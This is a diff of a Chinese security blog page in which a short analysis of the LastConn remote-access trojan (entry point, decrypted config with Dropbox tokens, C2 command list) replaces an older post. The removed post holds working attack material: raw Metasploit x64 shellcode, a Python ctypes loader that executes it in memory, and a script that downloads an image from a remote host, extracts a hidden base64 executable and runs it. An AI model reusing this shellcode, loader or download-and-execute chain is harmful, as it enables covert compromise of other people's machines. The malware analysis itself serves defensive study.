@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>一个比较捞的rat | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="一个比较捞的rat | 九世的博客">
+  <title>LastConn 样本简陋分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="LastConn 样本简陋分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1784,9 +1784,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-一个比较捞的rat" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-LastConn-样本简陋分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">一个比较捞的rat</h1>
+        <h1 class="article-title">LastConn 样本简陋分析</h1>
     
     <div class="article-meta">
         
@@ -1795,14 +1795,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-20 21:12:04">2019-04-20 20:21</time>
+        创建时间:<time class="date" title="更新时间: 2021-06-20 01:55:03">2021-06-20 01:35</time>
         
     </div>
     <div class="article-meta">
@@ -1824,7 +1824,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是rat"><span class="toc-text">什么是rat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#操作"><span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码"><span class="toc-text">代码</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#事件来源"><span class="toc-text">事件来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1839,141 +1839,65 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="什么是rat"><a href="#什么是rat" class="headerlink" title="什么是rat"></a>什么是rat</h3><p>可以在受害者机器内安装恶意组件<br>以下来自百度的解释：</p>
+        <h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p>
+<p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p>
+<p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p>
+<p>入口点</p>
+<pre><code class="c#">private static void LsfApkF4M()
+{
+            Application.EnableVisualStyles(); //启用视觉样式
+            if (Program.nigDBMdtyE5deZClpF != null)
+            {
+            }
+            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)
+            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null
+            {
+                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();
+                if (Program.nigDBMdtyE5deZClpF == null)
+                {
+                    Application.Run(new Form1());
+                }
+            }
+}
+</code></pre>
+<p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p>
+<p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p>
+<p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p>
+<p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p>
+<p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p>
+<p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p>
+<p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p>
+<p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p>
+<pre><code>txt_Totime=60 //超时时间
+@txt_Ftime=50
+@txt_FristTimeConn=45
+@txt_PathDir=C:\Users\Public\Downloads //下载存放路径
+@txt_PassRar=1D1VQB4G8Q //压缩包解压密码
+@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS
+@txt_KeyPath=SOFTWARE\Box
+@txt_LastConn=LastConn.txt
+@txt_ShellCode=ShellCode.txt
+@txt_ListFile=ListFile.txt
+@txt_isdownload=isdownload.txt
+@txt_FileToDown=FileToDown.txt
+@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy
+@txt_FileName=Viewfile //下载的压缩包名
+@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd
+@txt_FileOpen=news.doc //诱饵文档
+@txt_Setting=Setting
+</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p>
+<p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p>
+<p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p>
+<p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p>
+<p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p>
 <blockquote>
-<p>rat是特洛伊木马的一个变体，也成为net-hack程序。RAT是一个可以在目标计算机上安装服务器组件的恶意代码。</p>
+<p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p>
 </blockquote>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>1.msf生成shellcode<br>2.将shellcode base64编码藏在图片里<br>3.将图片放入远程站点<br>4.py写一个下载远程图片并匹配出base64写入exe<br>5.删除下载的图片</p>
-<h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>msf生成的shellcode</p>
-<pre><code>buf =  b&quot;&quot;
-buf += b&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41&quot;
-buf += b&quot;\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48&quot;
-buf += b&quot;\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f&quot;
-buf += b&quot;\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c&quot;
-buf += b&quot;\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52&quot;
-buf += b&quot;\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66&quot;
-buf += b&quot;\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80&quot;
-buf += b&quot;\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50&quot;
-buf += b&quot;\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
-buf += b&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48&quot;
-buf += b&quot;\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75&quot;
-buf += b&quot;\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44&quot;
-buf += b&quot;\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b&quot;
-buf += b&quot;\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;
-buf += b&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;
-buf += b&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
-buf += b&quot;\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f&quot;
-buf += b&quot;\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0&quot;
-buf += b&quot;\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0&quot;
-buf += b&quot;\xa8\xf1\x84\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba&quot;
-buf += b&quot;\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00&quot;
-buf += b&quot;\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41&quot;
-buf += b&quot;\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48&quot;
-buf += b&quot;\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf&quot;
-buf += b&quot;\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2&quot;
-buf += b&quot;\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0&quot;
-buf += b&quot;\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48&quot;
-buf += b&quot;\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;
-buf += b&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8&quot;
-buf += b&quot;\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;
-buf += b&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31&quot;
-buf += b&quot;\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49&quot;
-buf += b&quot;\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89&quot;
-buf += b&quot;\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d&quot;
-buf += b&quot;\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a&quot;
-buf += b&quot;\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41&quot;
-buf += b&quot;\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff&quot;
-buf += b&quot;\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4&quot;
-buf += b&quot;\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2&quot;
-buf += b&quot;\x56\xff\xd5&quot;
-</code></pre><p>使用py来执行shellcode</p>
-<pre><code class="python">import ctypes
-import sys
-import chardet
-from ctypes import *
-import binascii
-
-buf =  b&quot;shellcode&quot;
-
-
-
-#这两个微软官方说明是可读可写可执行，PAGE_EXECUTE_READWRITE和VIRTUAL_MEM
-PAGE_EXECUTE_READWRITE = 0x00000040 #参数设定
-VIRTUAL_MEM = ( 0x1000 | 0x2000 ) #参数设定
-buf_arr = bytearray (buf) #shellcode变为一个新的字节数组
-buf_size = len(buf_arr) #计算shellcode的大小
-kernel32 = ctypes.cdll.LoadLibrary(&quot;kernel32.dll&quot;) #调用kernel32.dll
-kernel32.VirtualAlloc.restype = ctypes.c_uint64 #返回类型为c_uint64
-sc_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE) #设置
-buf_ptr = (ctypes.c_char * buf_size).from_buffer(buf_arr) #将shellcode指向指针
-#print(sc_ptr)
-#print(buf_ptr)
-kernel32.RtlMoveMemory(ctypes.c_uint64(sc_ptr),buf_ptr,ctypes.c_int(buf_size)) #调用dll，指向shellcode
-
-handle = kernel32.CreateThread(ctypes.c_int(0),
-ctypes.c_int(0),
-ctypes.c_uint64(sc_ptr),
-ctypes.c_int(0),
-ctypes.c_int(0),
-ctypes.pointer(ctypes.c_int(0)))
-kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
-</code></pre>
-<p>将执行shellcode的py打包成exe，然后打开，对其进行base64编码<br>然后用HxDx64打开指定的图片，然后将<br>base64编码的exe写入到图片里</p>
-<p>我的图片是<br><img src="https://s2.ax1x.com/2019/04/20/EPnxwn.png" alt=""></p>
-<p>加入base64编码后的exe<br><img src="https://s2.ax1x.com/2019/04/20/EPnzoq.png" alt=""></p>
-<p>加入shellcode后图片大小为7mb<br><img src="https://s2.ax1x.com/2019/04/20/EPupF0.png" alt=""></p>
-<p><b>注意</b></p>
-<pre><code>将其扔到远程站点，这里以phpstudy搭建为例，不要把放图床，图床会把你图片给模糊或减小你内存
-shellcode就少了
-</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>代码如下</p>
-<pre><code class="python">#author:九世
-#time:2019/4/20
-
-import asyncio
-import requests
-import re
-import base64
-import os
-
-async def demo():
-    url = &#39;http://192.168.3.83/timg.jpg&#39; #你的图片地址
-    rqt=requests.get(url=url)
-    with open(&#39;xxx.jpg&#39;,&#39;wb&#39;) as r:
-        r.write(rqt.content)
-
-def zx():
-    dq=open(&#39;xxx.jpg&#39;,&#39;rb&#39;)
-    zg=str(dq.read()).replace(&quot;b&#39;&quot;,&#39;&#39;).replace(&quot;&#39;&quot;,&#39;&#39;)
-    pp=re.findall(&#39;TVq.*&#39;,zg)
-    zh=base64.b64decode(pp[0])
-    with open(&#39;demo.exe&#39;,&#39;wb&#39;) as w:
-        w.write(zh)
-    os.remove(&#39;xxx.jpg&#39;)
-    os.system(&#39;demo.exe&#39;)
-
-def pd():
-    j=&#39;xxx.jpg&#39;
-    if os.path.exists(j):
-        file=os.path.getsize(j)
-        if file==7985376:
-            zx()
-        else:
-            exit()
-
-async  def main():
-    thead=[]
-    thead.append(asyncio.ensure_future(demo()))
-    await asyncio.wait(thead)
-if __name__ == &#39;__main__&#39;:
-    loop=asyncio.get_event_loop()
-    loop.run_until_complete(main())
-    loop.close()
-    pd()
-</code></pre>
-<p>测试结果<br><img src="https://s2.ax1x.com/2019/04/20/EPusmj.md.gif" alt=""></p>
-<p>仓库地址:</p>
-<pre><code>https://github.com/422926799/python/tree/master/%E7%AE%80%E5%8D%95%E7%9A%84RAT
-</code></pre><p><b>转载请声明：转自422926799.github.io</b></p>
+<p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1983,12 +1907,12 @@ if __name__ == &#39;__main__&#39;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>一个比较捞的rat</p>
+    <p><span class="copy-title">文章标题:</span>LastConn 样本简陋分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-20, 20:21:27</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-20, 21:12:04</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/10e14164.html" title="一个比较捞的rat">http://422926799.github.io/posts/10e14164.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-06-20, 01:35:48</p>
+    <p><span class="copy-title">最后更新:</span>2021-06-20, 01:55:03</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/519d2f5e.html" title="LastConn 样本简陋分析">http://422926799.github.io/posts/519d2f5e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
